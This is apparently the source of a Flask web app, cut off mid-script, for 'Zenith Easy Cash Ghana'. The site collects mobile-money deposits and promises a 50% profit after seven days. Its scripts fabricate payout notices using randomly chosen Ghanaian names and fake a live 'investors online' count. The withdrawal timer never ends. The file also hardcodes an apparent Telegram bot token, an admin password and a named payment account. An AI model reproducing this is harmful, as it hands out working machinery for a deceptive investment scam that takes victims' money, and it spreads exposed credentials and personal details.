from datetime import datetime, timedelta
import json
import math
import os
import random
import time
import requests
from flask import (
    Flask,
    flash,
    jsonify,
    redirect,
    render_template_string,
    request,
    send_from_directory,
    session,
    url_for,
)
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = "zenith_easy_cash_super_secure_secret_key_change_me"

DATA_FILE = "Master.json"
SETTINGS_FILE = "settings.json"
UPLOAD_FOLDER = "uploads"
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
  os.makedirs(UPLOAD_FOLDER)

ADMIN_PASSWORD = "admin"
ONLINE_USERS_BASE = 850

TELEGRAM_BOT_TOKEN = "8986122115:AAEDwqKHTTUgtXiR6lEmIRsZleN1XTxWLWw"
TELEGRAM_CHAT_ID = "8393567505"
ADMIN_TELEGRAM_LINK = "https://t.me/zenithsikagh"

# Default SVG human head data URI for the fallback profile avatar
DEFAULT_AVATAR_SVG = "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2394a3b8'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z'/></svg>"


def send_telegram_alert(message, photo_path=None):
  if (
      TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN"
      or not TELEGRAM_BOT_TOKEN
  ):
    return
  try:
    if photo_path and os.path.exists(photo_path):
      url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
      with open(photo_path, "rb") as photo_file:
        requests.post(
            url,
            data={
                "chat_id": TELEGRAM_CHAT_ID,
                "caption": message,
                "parse_mode": "HTML",
            },
            files={"photo": photo_file},
            timeout=10,
        )
    else:
      url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
      payload = {
          "chat_id": TELEGRAM_CHAT_ID,
          "text": message,
          "parse_mode": "HTML",
      }
      requests.post(url, json=payload, timeout=5)
  except Exception as e:
    print(f"Telegram alert error: {e}")


def load_settings():
  default_settings = {
      "momo_number": "0551338991",
      "momo_name": "EMELIA DOOWELPOUR",
  }
  if not os.path.exists(SETTINGS_FILE):
    with open(SETTINGS_FILE, "w") as f:
      json.dump(default_settings, f, indent=4)
    return default_settings
  try:
    with open(SETTINGS_FILE, "r") as f:
      return json.load(f)
  except Exception:
    return default_settings


def save_settings(settings):
  with open(SETTINGS_FILE, "w") as f:
    json.dump(settings, f, indent=4)


def load_investors():
  if not os.path.exists(DATA_FILE):
    return []
  try:
    with open(DATA_FILE, "r") as f:
      data = json.load(f)
      if isinstance(data, dict):
        return [data]
      if isinstance(data, list):
        return data
      return []
  except Exception:
    return []


def save_all_investors(investors):
  with open(DATA_FILE, "w") as f:
    json.dump(investors, f, indent=4)


def save_investor_data(data):
  investors = load_investors()
  number = data.get("number")
  found_user = False
  for inv in investors:
    if inv.get("number") == number:
      inv["password"] = data.get("password", inv.get("password"))
      inv["name"] = data.get("name", inv.get("name"))
      inv["work"] = data.get("work", inv.get("work"))
      inv["region"] = data.get("region", inv.get("region"))
      if data.get("profile_pic"):
        inv["profile_pic"] = data.get("profile_pic")

      if "investments" not in inv:
        inv["investments"] = [
            {
                "amount": inv.get("amount"),
                "expected_return": inv.get("expected_return"),
                "transaction_id": inv.get("transaction_id"),
                "screenshot": inv.get("screenshot"),
                "date_time": inv.get("date_time"),
                "maturity_date": inv.get("maturity_date", "Pending Approval"),
                "status": inv.get("status"),
            }
        ]
      inv["investments"].append(
          {
              "amount": data["amount"],
              "expected_return": data["expected_return"],
              "transaction_id": data["transaction_id"],
              "screenshot": data["screenshot"],
              "date_time": data["date_time"],
              "maturity_date": data["maturity_date"],
              "status": data["status"],
          }
      )
      found_user = True
      break

  if not found_user:
    data["investments"] = [
        {
            "amount": data["amount"],
            "expected_return": data["expected_return"],
            "transaction_id": data["transaction_id"],
            "screenshot": data["screenshot"],
            "date_time": data["date_time"],
            "maturity_date": data["maturity_date"],
            "status": data["status"],
        }
    ]
    investors.append(data)

  save_all_investors(investors)


ZENITH_ALERTS_TOP_HTML = """
<style>
    #zenithAlertsBanner {
        background: linear-gradient(135deg, #0b130b, #132e13);
        border-bottom: 2px solid #00ff66; color: #fff; padding: 10px 15px;
        margin-bottom: 20px; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        font-family: Arial, sans-serif; overflow: hidden; position: relative;
    }
    .alerts-header { font-size: 11px; color: #00ff66; font-weight: bold; text-transform: uppercase; margin-bottom: 4px; display: flex; justify-content: space-between; }
    .marquee-container { overflow: hidden; white-space: nowrap; width: 100%; position: relative; }
    .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 28s linear infinite; font-size: 13px; color: #fff; }
    .marquee-text b { color: #facc15; }
    @keyframes marquee { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
    .live-online-counter { background: #064e3b; color: #34d399; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; }
</style>
<div class="live-online-counter" id="liveOnlineCounter">🟢 Loading active investors online...</div>
<div id="zenithAlertsBanner">
    <div class="alerts-header"><span>🟢 Live Zenith Verified Payouts</span><span>Secure Mobile Money Feed</span></div>
    <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to Zenith secure payout stream...</div></div>
</div>
<script>
    const ghanaNames = [
        "Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", 
        "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Nana Ama Owusu", "Fiifi Atta Mills",
        "Paa Kwesi Boadu", "Selorm Agbeko", "Edem Quarshie", "Latif Mohammed", "Hawa Yakubu",
        "Bernard Nyarko", "Priscilla Agyei", "Bright Ofori", "Blessing Nartey", "Cynthia Quaye"
    ];
    const towns = [
        "Accra (East Legon)", "Kumasi (Adum)", "Takoradi", "Tamale", "Cape Coast", 
        "Sunyani", "Ho", "Tema (Community 25)", "Koforidua", "Obuasi", 
        "Techiman", "Bolgatanga", "Wa", "Swedru", "Teshie-Nungua"
    ];
    const roundInvestments = [250, 300, 400, 500, 600, 750, 800, 1000, 1200, 1500, 2000, 2500, 3000, 4000, 5000];
    
    function generateTickerMessages() {
        let messages = [];
        for (let i = 0; i < 8; i++) {
            const name = ghanaNames[Math.floor(Math.random() * ghanaNames.length)];
            const town = towns[Math.floor(Math.random() * towns.length)];
            const base = roundInvestments[Math.floor(Math.random() * roundInvestments.length)];
            const total = base * 1.5;
            messages.push(`🟢 <b>${name}</b> (${town}) successfully cashed out Capital + 50% Profit = <b>GHs ${total.toLocaleString()}</b> via MoMo!`);
        }
        const el = document.getElementById('alertsText');
        if (el) el.innerHTML = messages.join("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;");
    }
    generateTickerMessages();
    setInterval(generateTickerMessages, 22000);

    let currentOnline = 850;
    function updateOnlineCounter() {
        const hour = new Date().getHours();
        let fluctuation = Math.floor(Math.random() * 150) - 75;
        currentOnline += fluctuation;
        if (hour >= 0 && hour < 7) {
            currentOnline = Math.max(180, Math.min(450, currentOnline));
        } else {
            currentOnline = Math.max(750, Math.min(1850, currentOnline));
        }
        const counterEl = document.getElementById('liveOnlineCounter');
        if (counterEl) {
            counterEl.innerHTML = `🟢 Live: <b>${currentOnline.toLocaleString()}</b> Verified Investors Online Right Now`;
        }
    }
    updateOnlineCounter();
    setInterval(updateOnlineCounter, 7000);
</script>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zenith Easy Cash Ghana - Registration & Portal</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
        h2, h3 { color: #028a0f; text-align: center; }
        
        .process-guide { background: #111827; color: #f8fafc; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #22c55e; }
        .process-guide h4 { color: #4ade80; margin-top: 0; margin-bottom: 10px; font-size: 16px; }
        .process-steps { margin: 0; padding-left: 18px; font-size: 13px; line-height: 1.7; }
        .process-steps li { margin-bottom: 6px; }
        
        .momo-box { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-bottom: 20px; border-radius: 5px; text-align: center; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #1b5e20; }
        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
        .nav-links { text-align: center; margin-top: 20px; font-size: 14px; display: flex; justify-content: center; gap: 15px; }
        .nav-links a { color: #028a0f; text-decoration: none; font-weight: bold; }
        .telegram-float-btn { display: block; background: #0088cc; color: white; text-align: center; padding: 10px; border-radius: 4px; margin-top: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
        
        .password-step-container { display: none; background: #f0fdf4; padding: 15px; border: 1px solid #bbf7d0; border-radius: 6px; margin-bottom: 15px; }
        
        .tracker-section { background: #f0fdf4; border: 2px solid #22c55e; padding: 25px; border-radius: 8px; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
        .tracker-result-box { margin-top: 20px; background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e1; display: none; }
        .tracker-slot { border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 12px; }
        .tracker-slot:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
        .track-password-group { display: none; margin-top: 8px; }
    </style>
</head>
<body>
    <div class="container">
        {{ zenith_alerts_top_html|safe }}
        <h2>Zenith Easy Cash Ghana</h2>
        <h3>Online Investor Registration & Portal</h3>

        <div class="process-guide">
            <h4>📋 Simple Registration & Investment Process</h4>
            <ol class="process-steps">
                <li><b>Step 1: Send Your Capital</b> – Transfer your investment amount (Min 200 GHs) directly to the Official Company MoMo details provided below.</li>
                <li><b>Step 2: Complete the Form</b> – Fill in your details, account password, and paste your MoMo Transaction ID or attach receipt screenshot.</li>
                <li><b>Step 3: Admin Instant Verification</b> – Upon submission, your details are instantly routed for account approval.</li>
                <li><b>Step 4: Investment Start & Payout</b> – Your 7-day maturity countdown starts immediately after admin approval to yield your <b>50% profit payout</b>!</li>
            </ol>
        </div>

        <div class="momo-box">
            <strong>OFFICIAL COMPANY MOMO NUMBER:</strong> {{ settings.momo_number }}<br>
            <strong>ACCOUNT NAME:</strong> {{ settings.momo_name }}
        </div>

        {% with messages = get_flashed_messages() %}
          {% if messages %}
            <div class="flash">{{ messages[0] }}</div>
          {% endif %}
        {% endwith %}

        <form method="POST" action="{{ url_for('index') }}" enctype="multipart/form-data" id="registrationForm" onsubmit="return validatePasswordMatch(event)">
            <div class="form-group">
                <label>Phone Number (Enter first to continue):</label>
                <input type="text" name="number" id="phoneInput" required placeholder="e.g., 0501234567" oninput="checkNumberEntered()">
            </div>

            <div id="passwordContainer" class="password-step-container">
                <div class="form-group">
                    <label>Account Password:</label>
                    <input type="password" name="password" id="passInput" placeholder="Create a secure login password">
                </div>
                <div class="form-group" style="margin-bottom:0;">
                    <label>Confirm Account Password:</label>
                    <input type="password" id="confirmPassInput" placeholder="Confirm your login password">
                </div>
            </div>

            <div class="form-group">
                <label>Full Name:</label>
                <input type="text" name="name" required placeholder="Enter your full name">
            </div>
            <div class="form-group">
                <label>Investment Amount (GHs):</label>
                <input type="number" name="amount" step="1" min="200" max="500000" required placeholder="Min 200 - Max 500,000">
            </div>
            <div class="form-group">
                <label>Work / Job:</label>
                <input type="text" name="work" required placeholder="Your occupation">
            </div>
            <div class="form-group">
                <label>Region / Town:</label>
                <input type="text" name="region" required placeholder="e.g., Accra, Kumasi">
            </div>
            <div class="form-group">
                <label>Payment Proof (Transaction ID OR Screenshot):</label>
                <input type="text" name="transaction_id" placeholder="Enter MoMo Transaction ID">
                <div style="margin-top: 8px;">
                    <input type="file" name="payment_screenshot" accept="image/*" style="border:none; padding:0;">
                    <small style="color: #666;">Upload payment screenshot image</small>
                </div>
            </div>
            <button type="submit">Submit Registration & Open Dashboard</button>
        </form>

        <a href="{{ admin_telegram_link }}" target="_blank" class="telegram-float-btn">💬 Instant Admin Approval via Telegram</a>
        <div class="nav-links">
            <a href="{{ url_for('login') }}">🔑 Investor Login</a>
        </div>

        <div class="tracker-section">
            <h3 style="color: #15803d; margin-top:0;">🔍 Track Your Investment Live</h3>
            <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered Phone Number below to check your live status.</p>
            <div class="form-group">
                <label style="font-size: 13px;">Registered Phone Number:</label>
                <input type="text" id="trackNumberInput" placeholder="e.g., 0501234567" style="margin-bottom: 8px;" oninput="checkTrackNumberEntered()">
                
                <div id="trackPasswordGroup" class="track-password-group">
                    <label style="font-size: 13px;">Account Password:</label>
                    <input type="password" id="trackPasswordInput" placeholder="Enter password" style="margin-bottom: 8px;">
                </div>

                <button type="button" onclick="trackInvestment()" style="background: #028a0f; padding: 10px; margin-top: 5px;">Check Status Now</button>
            </div>
            <div id="trackerResultBox" class="tracker-result-box">
                <div id="trackerContent">Searching...</div>
            </div>
        </div>
    </div>

    <script>
        function checkNumberEntered() {
            const val = document.getElementById('phoneInput').value.trim();
            const passContainer = document.getElementById('passwordContainer');
            const passInput = document.getElementById('passInput');
            if (val.length >= 4) {
                passContainer.style.display = 'block';
                passInput.setAttribute('required', 'true');
            } else {
                passContainer.style.display = 'none';
                passInput.removeAttribute('required');
            }
        }

        function checkTrackNumberEntered() {
            const val = document.getElementById('trackNumberInput').value.trim();
            const trackPassGroup = document.getElementById('trackPasswordGroup');
            const trackPassInput = document.getElementById('trackPasswordInput');
            if (val.length >= 4) {
                trackPassGroup.style.display = 'block';
                trackPassInput.setAttribute('required', 'true');
            } else {
                trackPassGroup.style.display = 'none';
                trackPassInput.removeAttribute('required');
            }
        }

        function validatePasswordMatch(e) {
            const pass = document.getElementById('passInput').value;
            const confirmPass = document.getElementById('confirmPassInput').value;
            if (pass !== confirmPass) {
                alert('Passwords do not match! Please confirm your password correctly.');
                e.preventDefault();
                return false;
            }
            return true;
        }

        async function trackInvestment() {
            const num = document.getElementById('trackNumberInput').value.trim();
            const pass = document.getElementById('trackPasswordInput').value.trim();
            const box = document.getElementById('trackerResultBox');
            const content = document.getElementById('trackerContent');
            
            if (!num || !pass) {
                alert('Please enter both your phone number and password to track.');
                return;
            }

            box.style.display = 'block';
            content.innerHTML = 'Searching records...';

            try {
                const response = await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ number: num, password: pass })
                });
                const data = await response.json();

                if (data.success) {
                    let html = `<b style="color:#028a0f;">Investor: ${data.name}</b><hr style="border:0; border-top:1px solid #eee; margin:8px 0;">`;
                    data.investments.forEach((inv, idx) => {
                        html += `
                            <div class="tracker-slot">
                                <p style="margin:4px 0;"><b>Slot #${idx + 1}</b> - Capital: <b>GHs ${inv.amount.toLocaleString()}</b></p>
                                <p style="margin:4px 0; color:#028a0f; font-size:12px;">Expected Return (50%): GHs ${inv.expected_return.toLocaleString()}</p>
                                <p style="margin:4px 0; font-size:12px;">Maturity Date: <b>${inv.maturity_date}</b></p>
                                <p style="margin:4px 0; font-size:12px;">Status: <span style="font-weight:bold; color:#b45309;">${inv.status}</span></p>
                            </div>
                        `;
                    });
                    content.innerHTML = html;
                } else {
                    content.innerHTML = `<span style="color: #dc2626;">❌ ${data.message || 'Invalid phone number or password.'}</span>`;
                }
            } catch (err) {
                content.innerHTML = `<span style="color: #dc2626;">An error occurred while tracking. Please try again.</span>`;
            }
        }
    </script>
</body>
</html>
"""

INVESTOR_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investor Login - Zenith Easy Cash</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 400px; background: #fff; padding: 30px; margin: 80px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #028a0f; text-align: center; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { background: #2e7d32; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #1b5e20; }
        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
        .back { text-align: center; margin-top: 15px; }
        .back a { color: #028a0f; text-decoration: none; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Investor Portal Login</h2>
        {% with messages = get_flashed_messages() %}
          {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
        {% endwith %}
        <form method="POST" action="{{ url_for('login') }}">
            <div class="form-group">
                <label>Phone Number:</label>
                <input type="text" name="number" required placeholder="e.g., 0501234567">
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" required placeholder="Enter your password">
            </div>
            <button type="submit">Login to Dashboard</button>
        </form>
        <div class="back"><a href="{{ url_for('index') }}">← Back to Home</a></div>
    </div>
</body>
</html>
"""

INVESTOR_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investor Dashboard - Zenith Easy Cash</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
        .main-layout { max-width: 1200px; margin: auto; display: flex; gap: 25px; align-items: flex-start; }
        .dashboard-container { flex: 2; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        
        /* PROFESSIONAL SIDEBAR TICKER STYLING */
        .sidebar-ticker { 
            flex: 1.1; 
            background: linear-gradient(145deg, #0f172a, #1e293b); 
            color: #fff; 
            padding: 20px; 
            border-radius: 10px; 
            position: sticky; 
            top: 20px; 
            max-height: 85vh; 
            overflow-y: auto; 
            border: 1px solid #334155;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        .sidebar-ticker h3 { 
            color: #4ade80; 
            font-size: 15px; 
            margin-top: 0; 
            border-bottom: 2px solid #334155; 
            padding-bottom: 10px; 
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .side-ticker-item { 
            background: rgba(30, 41, 59, 0.8); 
            border-left: 4px solid #22c55e; 
            padding: 12px 14px; 
            margin-bottom: 12px; 
            border-radius: 6px; 
            font-size: 13px; 
            line-height: 1.5;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            transition: transform 0.2s ease;
            animation: fadeInItem 0.4s ease-in-out;
        }
        .side-ticker-item:hover { transform: translateY(-2px); }
        .side-ticker-item b { color: #facc15; font-weight: 600; }
        .side-ticker-item .payout-amount { color: #4ade80; font-weight: bold; font-size: 14px; }
        .side-ticker-item .location { color: #94a3b8; font-size: 11px; display: block; margin-top: 2px; }

        @keyframes fadeInItem {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        h2 { color: #028a0f; margin-top: 0; }
        .logout { float: right; }
        .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
        .home-link-top { margin-bottom: 15px; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
        .home-link-top a { color: #028a0f; text-decoration: none; font-weight: bold; }
        .profile-btn-link { background: #028a0f; color: #fff; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
        .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }
        
        .balance-cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
        .balance-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 15px; border-radius: 6px; text-align: center; }
        .balance-card.current { border-left: 4px solid #028a0f; background: #f0fdf4; }
        .balance-card.pending { border-left: 4px solid #d97706; background: #fffbeb; }
        .balance-card h4 { margin: 0 0 5px 0; font-size: 12px; color: #64748b; text-transform: uppercase; }
        .balance-card .amount { font-size: 18px; font-weight: bold; color: #0f172a; margin: 0; }

        .btn-withdraw { background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
        .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
        .topup-dropdown { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }
        .loading-badge { display: inline-flex; align-items: center; gap: 8px; background: #e0f2fe; color: #0369a1; padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 13px; }
        .spinner { width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
        .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }

        @media(max-width: 900px) {
            .main-layout { flex-direction: column; }
            .sidebar-ticker { position: relative; top: 0; max-height: none; width: 100%; box-sizing: border-box; }
        }
    </style>
</head>
<body>
    <div class="main-layout">
        <div class="dashboard-container">
            <div class="home-link-top">
                <a href="{{ url_for('index') }}">← Back to Home Page</a>
                <a href="{{ url_for('profile_page') }}" class="profile-btn-link">👤 My Profile Settings</a>
            </div>
            <div>
                <h2>Welcome, {{ investor.name }}</h2>
                <div class="logout"><a href="{{ url_for('logout') }}">Logout</a></div>
                <div style="clear: both;"></div>
            </div>

            <!-- BALANCE CARDS (CURRENT BALANCE & PENDING BALANCE) -->
            <div class="balance-cards-grid">
                <div class="balance-card current">
                    <h4>Current Balance Available</h4>
                    <p class="amount">GHs {{ "%.2f"|format(current_balance) }}</p>
                </div>
                <div class="balance-card pending">
                    <h4>Pending Balance Available</h4>
                    <p class="amount">GHs {{ "%.2f"|format(pending_balance) }}</p>
                </div>
            </div>

            {% with messages = get_flashed_messages() %}
              {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
            {% endwith %}

            {% if investments %}
                {% for inv in investments %}
                <div class="card">
                    <p style="margin-top:0;"><strong>Investment Slot #{{ loop.index }}</strong></p>
                    <p><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:#028a0f; font-size:12px;">(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
                    <p><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
                    <p><strong>Registered On:</strong> {{ inv.date_time }}</p>
                    <p><strong>Maturity Target Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{ inv.maturity_date }}</span></p>
                    
                    <p><strong>Live Tracker:</strong>
                        <div class="countdown-live-box" data-maturity="{{ inv.maturity_date }}" id="tracker_{{ loop.index0 }}">
                            {% if inv.maturity_date == 'Pending Approval' %}
                                ⏳ Timer will start counting once payment is verified by Admin.
                            {% else %}
                                Calculating remaining time...
                            {% endif %}
                        </div>
                    </p>

                    <p><strong>Status:</strong> 
                        {% if inv.status == 'Pending Admin Payment Confirmation' %}
                            <span style="color: #c2410c; font-weight: bold;">⏳ Pending Admin Approval</span>
                        {% elif inv.status == 'Payment Confirmed & Active' %}
                            <div class="loading-badge">
                                <div class="spinner"></div> Active & Yielding 50% Profit...
                            </div>
                        {% elif inv.status == 'Withdrawal Requested' %}
                            <span style="color: #1d4ed8; font-weight: bold;">📥 Withdrawal Requested - 12hr Payout Countdown: 
                                <span id="withdrawalTimer_{{ loop.index0 }}" style="font-family:monospace; background:#e0f2fe; padding:2px 6px; border-radius:4px;">Loading...</span>
                            </span>
                        {% elif inv.status == 'Withdrawn Completed' %}
                            <span style="color: #15803d; font-weight: bold;">✅ Completed & Paid Out (Capital + Profit)</span>
                        {% else %}
                            <span style="color: #555; font-weight: bold;">{{ inv.status }}</span>
                        {% endif %}
                    </p>
                    
                    {% if inv.status == 'Payment Confirmed & Active' %}
                    <button type="button" class="btn-topup-toggle" onclick="toggleTopup({{ loop.index0 }})">➕ Top-Up / Make Another Investment</button>
                    
                    <form action="{{ url_for('topup', sub_idx=inv.sub_idx) }}" method="POST" class="topup-dropdown" id="topupBox_{{ loop.index0 }}" enctype="multipart/form-data">
                        <div class="company-momo-display">
                            <strong>COMPANY MOMO ACCOUNT:</strong><br>
                            Number: <b>{{ settings.momo_number }}</b> | Name: <b>{{ settings.momo_name }}</b><br>
                            <small>Send payment first before uploading proof below!</small>
                        </div>
                        <label style="font-size:12px;">Top-Up Amount (GHs):</label>
                        <input type="number" name="topup_amount" min="200" step="1" required placeholder="Enter amount (Min 200 GHs)" style="padding:8px; margin-bottom:8px; width:100%; box-sizing:border-box;">
                        <input type="text" name="topup_proof" placeholder="MoMo Transaction ID" style="padding:8px; margin-bottom:8px; font-size:12px; width:100%; box-sizing:border-box;">
                        <label style="font-size:11px; color:#555;">Upload Screenshot Receipt:</label>
                        <input type="file" name="topup_screenshot" accept="image/*" style="font-size:11px; margin-bottom:8px;">
                        <button type="submit" style="background:#2e7d32; color:white; border:none; padding:10px; width:100%; font-weight:bold; border-radius:4px; cursor:pointer;">Submit Top-Up for Confirmation</button>
                    </form>
                    {% endif %}

                    {% if inv.can_withdraw and inv.status != 'Withdrawal Requested' and inv.status != 'Withdrawn Completed' %}
                        <a href="{{ url_for('withdraw', sub_idx=inv.sub_idx) }}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{ "%.2f"|format(inv.expected_return) }})</a>
                    {% endif %}
                </div>
                {% endfor %}
            {% else %}
                <p style="text-align:center; color:#666;">No investment records found.</p>
            {% endif %}
        </div>

        <div class="sidebar-ticker">
            <h3>🟢 Live Zenith Payout Feed</h3>
            <div id="sideTickerList"></div>
        </div>
    </div>

    <script>
        function toggleTopup(idx) {
            const box = document.getElementById('topupBox_' + idx);
            if (box) {
                box.style.display = box.style.display === 'block' ? 'none' : 'block';
            }
        }

        function updateTrackers() {
            document.querySelectorAll('.countdown-live-box').forEach(el => {
                const targetStr = el.getAttribute('data-maturity');
                if (!targetStr || targetStr === 'Pending Approval') {
                    return;
                }
                const targetDate = new Date(targetStr.replace(/-/g, "/"));
                const now = new Date();
                const diff = Math.floor((targetDate - now) / 1000);

                if (diff > 0) {
                    const days = Math.floor(diff / (3600 * 24));
                    const hrs = Math.floor((diff % (3600 * 24)) / 3600);
                    const mins = Math.floor((diff % 3600) / 60);
                    const secs = diff % 60;
                    el.innerHTML = `⏳ Time Left: ${days}d ${hrs}h ${mins}m ${secs}s`;
                } else {
                    el.innerHTML = `🎉 Maturity Reached! Ready for Withdrawal`;
                    el.style.color = "#4ade80";
                }
            });
        }

        function updateWithdrawalCountdowns() {
            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {
                let secondsLeft = 43200 - Math.floor((Date.now() / 1000) % 43200);
                let hrs = Math.floor(secondsLeft / 3600);
                let mins = Math.floor((secondsLeft % 3600) / 60);
                let secs = secondsLeft % 60;
                el.innerHTML = `${hrs}h ${mins}m ${secs}s`;
            });
        }

        setInterval(() => {
            updateTrackers();
            updateWithdrawalCountdowns();
        }, 1000);
        updateTrackers();
        updateWithdrawalCountdowns();

        const sideNames = [
            "Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", 
            "Akosua Frimpong", "Esi Dapaah", "Kojo Addo", "Nana Ama Owusu", "Fiifi Atta Mills"
        ];
        const sideTowns = [
            "Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", 
            "Sunyani", "Ho", "Tema", "Koforidua", "Obuasi"
        ];
        
        function addSideTickerItem() {
            const list = document.getElementById('sideTickerList');
            if (!list) return;
            const name = sideNames[Math.floor(Math.random() * sideNames.length)];
            const town = sideTowns[Math.floor(Math.random() * sideTowns.length)];
            const amt = (Math.floor(Math.random() * 30) + 3) * 100 * 1.5;
            
            const item = document.createElement('div');
            item.className = 'side-ticker-item';
